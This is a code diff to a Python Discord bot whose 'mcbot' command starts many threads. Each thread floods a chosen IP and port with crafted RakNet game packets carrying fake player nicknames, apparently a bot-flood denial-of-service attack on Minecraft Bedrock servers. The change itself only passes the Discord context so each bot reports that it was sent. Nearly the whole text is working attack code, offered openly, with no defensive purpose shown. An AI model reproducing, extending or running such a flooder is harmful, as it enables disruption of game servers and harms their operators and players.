@@ -34,7 +34,7 @@ class RakNet:
 class GamePackets:
     Ready = "840100006002f0010000000000001304"
 
-def attack_thread(ip, port, nickname):
+def attack_thread(ip, port, nickname, ctx):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         hex_ip = get_hex_ip(ip)
@@ -58,6 +58,7 @@ def attack_thread(ip, port, nickname):
             s.sendto(bytes.fromhex("c0000101000000"), (ip, port))
             s.sendto(bytes.fromhex(GamePackets.Ready) + session_id + bytes.fromhex("000000000000" + guid.guid1[2] + "00004800000000000000" + guid.guid1[2]), (ip, port))
             nick_hex = nickname.encode().hex()
+            asyncio.run_coroutine_threadsafe(ctx.send(f"Bot {nickname} sent!"), bot.loop)
             while not stop_event.is_set():
                 packet = bytes.fromhex("84020000702be0020000010000000000000c0000000000008e8f00" + hex(int(len(nick_hex)/2))[2:].zfill(2) + nick_hex + "0000002d0000002d" + hex(random.randint(1000000000000000000,9999999999999999999))[2:].zfill(16) + str(uuid.uuid4()).replace("-","") + "00" + hex(int(len(ip_port_hex)/2))[2:].zfill(2) + ip_port_hex)
                 s.sendto(packet, (ip, port))
@@ -76,7 +77,7 @@ async def mcbot(ctx, ip: str, port: int, bots: int):
     await ctx.send(f"Iniciando ataque a {ip}:{port} con {bots} bots.")
     for i in range(bots):
         nickname = nicknames[i]
-        thread = threading.Thread(target=attack_thread, args=(ip, port, nickname))
+        thread = threading.Thread(target=attack_thread, args=(ip, port, nickname, ctx))
         thread.start()
         active_threads.append(thread)
         await asyncio.sleep(0.1)
